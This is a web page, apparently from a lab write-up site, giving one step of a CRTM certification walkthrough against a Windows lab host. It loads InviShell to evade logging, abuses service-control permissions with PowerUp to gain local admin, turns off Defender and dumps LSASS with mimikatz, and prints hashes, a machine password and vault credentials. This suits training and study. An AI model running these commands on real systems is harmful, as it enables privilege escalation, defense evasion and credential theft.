@@ -1,0 +1,644 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>CRTM Walkthrough Global Central Bank | The webpage it’s based on my personal solution related with the cybersecurity Certification Certified Red Team Master (GCB) of Altered Security</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="CRTM Walkthrough Global Central Bank" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="The webpage it’s based on my personal solution related with the cybersecurity Certification Certified Red Team Master (GCB) of Altered Security" />
+<meta property="og:description" content="The webpage it’s based on my personal solution related with the cybersecurity Certification Certified Red Team Master (GCB) of Altered Security" />
+<link rel="canonical" href="http://localhost:4000/employee15.html" />
+<meta property="og:url" content="http://localhost:4000/employee15.html" />
+<meta property="og:site_name" content="CRTM Walkthrough Global Central Bank" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="CRTM Walkthrough Global Central Bank" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"The webpage it’s based on my personal solution related with the cybersecurity Certification Certified Red Team Master (GCB) of Altered Security","headline":"CRTM Walkthrough Global Central Bank","url":"http://localhost:4000/employee15.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>CRTM Walkthrough Global Central Bank</h1>
+        </a>
+        <h2>The webpage it's based on my personal solution related with the cybersecurity Certification Certified Red Team Master (GCB) of Altered Security</h2>
+
+        <section id="downloads">
+          
+            <a href="" class="btn">Download as .zip</a>
+            <a href="" class="btn">Download as .tar.gz</a>
+          
+          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <p>After the initial access with itemployee15 user, it’s required mapping an external folder to the RDP remote desktop target machine using the VPN access.</p>
+
+<p>The external connection could be :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rdesktop -r disk:tmp=/media/f0ns1/2376533c-e89e-40ac-a692-c181e0c0ade7/downloads/Tools 192.168.100.15  -u 'it\itemployee15' -p ''
+</code></pre></div></div>
+
+<p>The first program that I loaded It’s invishell:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Users\itemployee15&gt; cd C:\tools
+PS C:\tools&gt; copy \\tsclient\tmp\InviShell.zip .
+PS C:\tools&gt; Expand-Archive -Path .\InviShell.zip
+PS C:\tools&gt; cd .\InviShell\
+PS C:\tools\InviShell&gt; .\InviShell\RunWithRegistryNonAdmin.bat
+
+C:\tools\InviShell&gt;set COR_ENABLE_PROFILING=1
+
+C:\tools\InviShell&gt;set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}
+
+C:\tools\InviShell&gt;REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
+The operation completed successfully.
+
+C:\tools\InviShell&gt;REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /f
+The operation completed successfully.
+
+C:\tools\InviShell&gt;REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /ve /t REG_SZ /d "C:\tools\InviShell\InviShell\InShellProf.dll" /f
+The operation completed successfully.
+
+C:\tools\InviShell&gt;powershell
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\tools\InviShell&gt;
+</code></pre></div></div>
+
+<p>Perform an enumeration for the current user on the target machine and hunt for privilege escalation:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\tools\InviShell&gt; copy \\tsclient\tmp\PrivescCheck.ps1 .
+PS C:\tools\InviShell&gt; powershell -ep bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\tools\InviShell&gt; Import-Module C:\tools\InviShell\PrivescCheck.ps1
+PS C:\tools\InviShell&gt; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,CSV,HTML,XML
+
+</code></pre></div></div>
+<p>Detect a vulnerable SCM privileges for the current user:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+-----------------------------------------------------------------------------+
+|                         ~~~ PrivescCheck Report ~~~                         |
++----+------+-----------------------------------------------------------------+
+| OK | None | APPS &gt; Startup Apps                                             |
+| OK | None | APPS &gt; Modifiable Apps                                          |
+| NA | Info | APPS &gt; Non-default Apps -&gt; 4 result(s)                          |
+| NA | Info | APPS &gt; Startup Apps (info) -&gt; 1 result(s)                       |
+| NA | Info | APPS &gt; Running Processes -&gt; 33 result(s)                        |
+| NA | None | CONFIG &gt; SCCM Cache Folder (info)                               |
+| OK | None | CONFIG &gt; SCCM Cache Folder                                      |
+| OK | None | CONFIG &gt; PATH Folder Permissions                                |
+| OK | None | CONFIG &gt; AlwaysInstallElevated                                  |
+| OK | None | CONFIG &gt; PrintNightmare exploit                                 |
+| OK | None | CONFIG &gt; WSUS Configuration                                     |
+| NA | Info | CONFIG &gt; Driver Co-Installers -&gt; 1 result(s)                    |
+| NA | None | CREDS &gt; Credential Files                                        |
+| OK | None | CREDS &gt; WinLogon                                                |
+| OK | None | CREDS &gt; Unattend Files                                          |
+| NA | None | CREDS &gt; Vault Creds                                             |
+| NA | Info | CREDS &gt; PowerShell History -&gt; 1 result(s)                       |
+| OK | None | CREDS &gt; GPP Passwords                                           |
+| NA | Info | CREDS &gt; Vault List -&gt; 2 result(s)                               |
+| OK | None | CREDS &gt; SAM/SYSTEM/SECURITY in shadow copies                    |
+| OK | None | CREDS &gt; SAM/SYSTEM/SECURITY Files                               |
+| NA | Info | HARDENING &gt; UEFI &amp; Secure Boot -&gt; 2 result(s)                   |
+| NA | Info | HARDENING &gt; Credential Guard -&gt; 1 result(s)                     |
+| KO | Med. | HARDENING &gt; LSA Protection (RunAsPPL) -&gt; 1 result(s)            |
+| NA | Info | HARDENING &gt; LAPS -&gt; 1 result(s)                                 |
+| NA | Info | HARDENING &gt; LSA Protection (RunAsPPL) -&gt; 1 result(s)            |
+| NA | Info | HARDENING &gt; PowerShell Transcription -&gt; 1 result(s)             |
+| KO | Med. | HARDENING &gt; LAPS -&gt; 1 result(s)                                 |
+| NA | Info | HARDENING &gt; UAC Settings -&gt; 1 result(s)                         |
+| NA | Info | MISC &gt; Machine Role -&gt; 1 result(s)                              |
+| NA | None | MISC &gt; System Startup History                                   |
+| NA | None | MISC &gt; Last System Startup                                      |
+| NA | Info | MISC &gt; User Home Folders -&gt; 3 result(s)                         |
+| NA | Info | MISC &gt; Endpoint Protection -&gt; 35 result(s)                      |
+| NA | Info | MISC &gt; OS Version -&gt; 1 result(s)                                |
+| NA | Info | MISC &gt; Local Admin Group -&gt; 2 result(s)                         |
+| NA | Info | MISC &gt; Hijackable DLLs -&gt; 3 result(s)                           |
+| NA | Info | MISC &gt; Filesystem Drives -&gt; 1 result(s)                         |
+| NA | Info | NETWORK &gt; TCP Endpoints -&gt; 25 result(s)                         |
+| NA | Info | NETWORK &gt; Interfaces -&gt; 1 result(s)                             |
+| NA | None | NETWORK &gt; Saved Wifi Profiles                                   |
+| NA | Info | NETWORK &gt; UDP Endpoints -&gt; 18 result(s)                         |
+| OK | None | SCHEDULED TASKS &gt; Binary Permissions                            |
+| OK | None | SERVICES &gt; Registry Permissions                                 |
+| NA | Info | SERVICES &gt; Non-default Services -&gt; 6 result(s)                  |
+| OK | None | SERVICES &gt; Service Permissions                                  |
+| NA | None | SERVICES &gt; Unquoted Path (info)                                 |
+| KO | High | SERVICES &gt; Binary Permissions -&gt; 2 result(s)                    |
+| KO | High | SERVICES &gt; SCM Permissions -&gt; 1 result(s)                       |
+| OK | None | SERVICES &gt; Unquoted Path                                        |
+| NA | Info | UPDATES &gt; Last Windows Update Date -&gt; 1 result(s)               |
+| NA | Info | UPDATES &gt; System up to date? (info) -&gt; 21 result(s)             |
+| KO | Med. | UPDATES &gt; System up to date? -&gt; 1 result(s)                     |
+| NA | Info | USER &gt; Groups -&gt; 13 result(s)                                   |
+| NA | Info | USER &gt; Identity -&gt; 1 result(s)                                  |
+| NA | None | USER &gt; Restricted SIDs                                          |
+| NA | None | USER &gt; Environment Variables                                    |
+| NA | Info | USER &gt; Privileges -&gt; 2 result(s)                                |
++----+------+-----------------------------------------------------------------+
+</code></pre></div></div>
+
+<p>Abusse of scm privileges in order to create a new service:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\tools\InviShell&gt; mkdir C:\temp
+
+
+    Directory: C:\
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        7/18/2024  10:37 AM                temp
+
+
+PS C:\tools\InviShell&gt; echo test &gt; C:\temp\test.txt
+PS C:\tools\InviShell&gt; cmd /c sc create VULN binPath= "C:\temp\test.txt" start= auto error= ignore
+[SC] CreateService SUCCESS
+</code></pre></div></div>
+
+<p>Load the PowerUp module and exploit the service:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Microsoft Windows [Version 10.0.17763.5458]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\itemployee15&gt;C:\tools\InviShell\InviShell\RunWithPathAsAdmin.bat
+
+C:\Users\itemployee15&gt;set COR_ENABLE_PROFILING=1
+
+C:\Users\itemployee15&gt;set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}
+
+C:\Users\itemployee15&gt;set COR_PROFILER_PATH=C:\tools\InviShell\InviShell\InShellProf.dll
+
+C:\Users\itemployee15&gt;powershell
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\itemployee15&gt; Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
+PS C:\Users\itemployee15&gt; Import-Module \\tsclient\tmp\PowerUp.ps1
+
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Install-ServiceBinary -Name 'VULN' -Command 'net localgroup Administrators IT\itemployee15 /add'
+</code></pre></div></div>
+
+<p>Reboot the machine before the AV delete the new binary created. And wait for service execution during the logon.
+Reboot command executed from powershell</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shutdown /r /f /t 0
+</code></pre></div></div>
+
+<p>Logon again and validate the High Mandatory Level for the current user:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\system32&gt;powershell -ep bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32&gt; whoami /all
+
+USER INFORMATION
+----------------
+
+User Name       SID
+=============== ==============================================
+it\itemployee15 S-1-5-21-948911695-1962824894-4291460450-27607
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                           Attributes
+========================================== ================ ============================================= ===============================================================
+Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
+BUILTIN\Administrators                     Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
+BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
+LOCAL                                      Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group
+IT\ITEmployeesUsers                        Group            S-1-5-21-948911695-1962824894-4291460450-1124 Mandatory group, Enabled by default, Enabled group
+Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level       Label            S-1-16-12288
+</code></pre></div></div>
+
+<p>Disable AV on the employee machine and Dump Lsass process:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Windows\system32&gt; Set-MpPreference -DisableRealtimeMonitoring $True
+PS C:\Windows\system32&gt; cd C:\tools\
+PS C:\tools&gt; copy \\tsclient\tmp\mimikatz.exe .
+PS C:\tools&gt; .\mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" "vault::list" "vault::cred /patch" "exit"
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # privilege::debug
+Privilege '20' OK
+
+mimikatz(commandline) # sekurlsa::logonPasswords
+
+Authentication Id : 0 ; 487177 (00000000:00076f09)
+Session           : RemoteInteractive from 2
+User Name         : itemployee15
+Domain            : IT
+Logon Server      : IT-DC
+Logon Time        : 7/18/2024 12:34:54 PM
+SID               : S-1-5-21-948911695-1962824894-4291460450-27607
+        msv :
+         [00000003] Primary
+         * Username : itemployee15
+         * Domain   : IT
+         * NTLM     : 04a9656e95383f010ea532b17f721b58
+         * SHA1     : ea53159bf4ff1f92be2606aae153b01749a7c0aa
+         * DPAPI    : b0ae4be82ac0c69aee4067d9eb074383
+        tspkg :
+        wdigest :
+         * Username : itemployee15
+         * Domain   : IT
+         * Password : (null)
+        kerberos :
+         * Username : itemployee15
+         * Domain   : IT.GCB.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 486345 (00000000:00076bc9)
+Session           : RemoteInteractive from 2
+User Name         : itemployee15
+Domain            : IT
+Logon Server      : IT-DC
+Logon Time        : 7/18/2024 12:34:54 PM
+SID               : S-1-5-21-948911695-1962824894-4291460450-27607
+        msv :
+         [00000003] Primary
+         * Username : itemployee15
+         * Domain   : IT
+         * NTLM     : 04a9656e95383f010ea532b17f721b58
+         * SHA1     : ea53159bf4ff1f92be2606aae153b01749a7c0aa
+         * DPAPI    : b0ae4be82ac0c69aee4067d9eb074383
+        tspkg :
+        wdigest :
+         * Username : itemployee15
+         * Domain   : IT
+         * Password : (null)
+        kerberos :
+         * Username : itemployee15
+         * Domain   : IT.GCB.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 424756 (00000000:00067b34)
+Session           : Interactive from 2
+User Name         : UMFD-2
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 7/18/2024 12:34:49 PM
+SID               : S-1-5-96-0-2
+        msv :
+         [00000003] Primary
+         * Username : IT-EMPLOYEE15$
+         * Domain   : IT
+         * NTLM     : 58f21e37d421c223c32cef2fab566ab5
+         * SHA1     : 0b3e8b9148dd2f878874f0af5140379e91c82eb8
+         * DPAPI    : 0b3e8b9148dd2f878874f0af5140379e
+        tspkg :
+        wdigest :
+         * Username : IT-EMPLOYEE15$
+         * Domain   : IT
+         * Password : (null)
+        kerberos :
+         * Username : IT-EMPLOYEE15$
+         * Domain   : it.gcb.local
+         * Password : xls0taG6Yibm&lt;/aI6^O%oGN&amp;\BAl=tKmhYjD0 B`-=Jt\Xt7GyF(g&gt;&gt;\Xz[6vP)zkvU'q3B^:N]&amp;&amp;&lt;$*[&gt;-TP-`R$*j"_UTH:,8A-s]sW\M+K$:b\fG+%&amp;z=
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : IT-EMPLOYEE15$
+Domain            : IT
+Logon Server      : (null)
+Logon Time        : 7/18/2024 12:34:23 PM
+SID               : S-1-5-20
+        msv :
+         [00000003] Primary
+         * Username : IT-EMPLOYEE15$
+         * Domain   : IT
+         * NTLM     : 58f21e37d421c223c32cef2fab566ab5
+         * SHA1     : 0b3e8b9148dd2f878874f0af5140379e91c82eb8
+         * DPAPI    : 0b3e8b9148dd2f878874f0af5140379e
+        tspkg :
+        wdigest :
+         * Username : IT-EMPLOYEE15$
+         * Domain   : IT
+         * Password : (null)
+        kerberos :
+         * Username : it-employee15$
+         * Domain   : IT.GCB.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 29032 (00000000:00007168)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 7/18/2024 12:34:22 PM
+SID               : S-1-5-96-0-1
+        msv :
+         [00000003] Primary
+         * Username : IT-EMPLOYEE15$
+         * Domain   : IT
+         * NTLM     : 58f21e37d421c223c32cef2fab566ab5
+         * SHA1     : 0b3e8b9148dd2f878874f0af5140379e91c82eb8
+         * DPAPI    : 0b3e8b9148dd2f878874f0af5140379e
+        tspkg :
+        wdigest :
+         * Username : IT-EMPLOYEE15$
+         * Domain   : IT
+         * Password : (null)
+        kerberos :
+         * Username : IT-EMPLOYEE15$
+         * Domain   : it.gcb.local
+         * Password : xls0taG6Yibm&lt;/aI6^O%oGN&amp;\BAl=tKmhYjD0 B`-=Jt\Xt7GyF(g&gt;&gt;\Xz[6vP)zkvU'q3B^:N]&amp;&amp;&lt;$*[&gt;-TP-`R$*j"_UTH:,8A-s]sW\M+K$:b\fG+%&amp;z=
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 29000 (00000000:00007148)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 7/18/2024 12:34:22 PM
+SID               : S-1-5-96-0-0
+        msv :
+         [00000003] Primary
+         * Username : IT-EMPLOYEE15$
+         * Domain   : IT
+         * NTLM     : 58f21e37d421c223c32cef2fab566ab5
+         * SHA1     : 0b3e8b9148dd2f878874f0af5140379e91c82eb8
+         * DPAPI    : 0b3e8b9148dd2f878874f0af5140379e
+        tspkg :
+        wdigest :
+         * Username : IT-EMPLOYEE15$
+         * Domain   : IT
+         * Password : (null)
+        kerberos :
+         * Username : IT-EMPLOYEE15$
+         * Domain   : it.gcb.local
+         * Password : xls0taG6Yibm&lt;/aI6^O%oGN&amp;\BAl=tKmhYjD0 B`-=Jt\Xt7GyF(g&gt;&gt;\Xz[6vP)zkvU'q3B^:N]&amp;&amp;&lt;$*[&gt;-TP-`R$*j"_UTH:,8A-s]sW\M+K$:b\fG+%&amp;z=
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 27090 (00000000:000069d2)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 7/18/2024 12:34:22 PM
+SID               :
+        msv :
+         [00000003] Primary
+         * Username : IT-EMPLOYEE15$
+         * Domain   : IT
+         * NTLM     : 58f21e37d421c223c32cef2fab566ab5
+         * SHA1     : 0b3e8b9148dd2f878874f0af5140379e91c82eb8
+         * DPAPI    : 0b3e8b9148dd2f878874f0af5140379e
+        tspkg :
+        wdigest :
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 427016 (00000000:00068408)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 7/18/2024 12:34:49 PM
+SID               : S-1-5-90-0-2
+        msv :
+         [00000003] Primary
+         * Username : IT-EMPLOYEE15$
+         * Domain   : IT
+         * NTLM     : 58f21e37d421c223c32cef2fab566ab5
+         * SHA1     : 0b3e8b9148dd2f878874f0af5140379e91c82eb8
+         * DPAPI    : 0b3e8b9148dd2f878874f0af5140379e
+        tspkg :
+        wdigest :
+         * Username : IT-EMPLOYEE15$
+         * Domain   : IT
+         * Password : (null)
+        kerberos :
+         * Username : IT-EMPLOYEE15$
+         * Domain   : it.gcb.local
+         * Password : xls0taG6Yibm&lt;/aI6^O%oGN&amp;\BAl=tKmhYjD0 B`-=Jt\Xt7GyF(g&gt;&gt;\Xz[6vP)zkvU'q3B^:N]&amp;&amp;&lt;$*[&gt;-TP-`R$*j"_UTH:,8A-s]sW\M+K$:b\fG+%&amp;z=
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 426618 (00000000:0006827a)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 7/18/2024 12:34:49 PM
+SID               : S-1-5-90-0-2
+        msv :
+         [00000003] Primary
+         * Username : IT-EMPLOYEE15$
+         * Domain   : IT
+         * NTLM     : 58f21e37d421c223c32cef2fab566ab5
+         * SHA1     : 0b3e8b9148dd2f878874f0af5140379e91c82eb8
+         * DPAPI    : 0b3e8b9148dd2f878874f0af5140379e
+        tspkg :
+        wdigest :
+         * Username : IT-EMPLOYEE15$
+         * Domain   : IT
+         * Password : (null)
+        kerberos :
+         * Username : IT-EMPLOYEE15$
+         * Domain   : it.gcb.local
+         * Password : xls0taG6Yibm&lt;/aI6^O%oGN&amp;\BAl=tKmhYjD0 B`-=Jt\Xt7GyF(g&gt;&gt;\Xz[6vP)zkvU'q3B^:N]&amp;&amp;&lt;$*[&gt;-TP-`R$*j"_UTH:,8A-s]sW\M+K$:b\fG+%&amp;z=
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 7/18/2024 12:34:24 PM
+SID               : S-1-5-19
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 48463 (00000000:0000bd4f)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 7/18/2024 12:34:23 PM
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : IT-EMPLOYEE15$
+         * Domain   : IT
+         * NTLM     : 58f21e37d421c223c32cef2fab566ab5
+         * SHA1     : 0b3e8b9148dd2f878874f0af5140379e91c82eb8
+         * DPAPI    : 0b3e8b9148dd2f878874f0af5140379e
+        tspkg :
+        wdigest :
+         * Username : IT-EMPLOYEE15$
+         * Domain   : IT
+         * Password : (null)
+        kerberos :
+         * Username : IT-EMPLOYEE15$
+         * Domain   : it.gcb.local
+         * Password : xls0taG6Yibm&lt;/aI6^O%oGN&amp;\BAl=tKmhYjD0 B`-=Jt\Xt7GyF(g&gt;&gt;\Xz[6vP)zkvU'q3B^:N]&amp;&amp;&lt;$*[&gt;-TP-`R$*j"_UTH:,8A-s]sW\M+K$:b\fG+%&amp;z=
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 48391 (00000000:0000bd07)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 7/18/2024 12:34:23 PM
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : IT-EMPLOYEE15$
+         * Domain   : IT
+         * NTLM     : 58f21e37d421c223c32cef2fab566ab5
+         * SHA1     : 0b3e8b9148dd2f878874f0af5140379e91c82eb8
+         * DPAPI    : 0b3e8b9148dd2f878874f0af5140379e
+        tspkg :
+        wdigest :
+         * Username : IT-EMPLOYEE15$
+         * Domain   : IT
+         * Password : (null)
+        kerberos :
+         * Username : IT-EMPLOYEE15$
+         * Domain   : it.gcb.local
+         * Password : xls0taG6Yibm&lt;/aI6^O%oGN&amp;\BAl=tKmhYjD0 B`-=Jt\Xt7GyF(g&gt;&gt;\Xz[6vP)zkvU'q3B^:N]&amp;&amp;&lt;$*[&gt;-TP-`R$*j"_UTH:,8A-s]sW\M+K$:b\fG+%&amp;z=
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : IT-EMPLOYEE15$
+Domain            : IT
+Logon Server      : (null)
+Logon Time        : 7/18/2024 12:34:22 PM
+SID               : S-1-5-18
+        msv :
+        tspkg :
+        wdigest :
+         * Username : IT-EMPLOYEE15$
+         * Domain   : IT
+         * Password : (null)
+        kerberos :
+         * Username : it-employee15$
+         * Domain   : IT.GCB.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+mimikatz(commandline) # vault::list
+
+Vault : {4bf4c442-9b8a-41a0-b380-dd4a704ddb28}
+        Name       : Web Credentials
+        Path       : C:\Users\itemployee15\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
+        Items (2)
+          0.    Internet Explorer
+                Type            : {3ccd5499-87a8-4b10-a215-608888dd3b55}
+                LastWritten     : 4/29/2024 4:11:22 AM
+                Flags           : 00000400
+                Ressource       : [STRING] http://192.168.4.111/
+                Identity        : [STRING] root
+                Authenticator   :
+                PackageSid      :
+                *Authenticator* : [STRING] BugTrackerL0g1n
+          1.    Internet Explorer
+                Type            : {3ccd5499-87a8-4b10-a215-608888dd3b55}
+                LastWritten     : 4/29/2024 4:11:34 AM
+                Flags           : 00000400
+                Ressource       : [STRING] http://192.168.4.111/
+                Identity        : [STRING] itemployees
+                Authenticator   :
+                PackageSid      :
+                *Authenticator* : [STRING] ReadOnlyAccess
+
+Vault : {77bc582b-f0a6-4e15-4e80-61736b6f3b29}
+        Name       : Windows Credentials
+        Path       : C:\Users\itemployee15\AppData\Local\Microsoft\Vault
+        Items (0)
+
+mimikatz(commandline) # vault::cred /patch
+
+mimikatz(commandline) # exit
+Bye!
+
+</code></pre></div></div>
+
+<p><a href="./section1.html">back</a></p>
+
+      </section>
+    </div>
+  </body>
+</html>
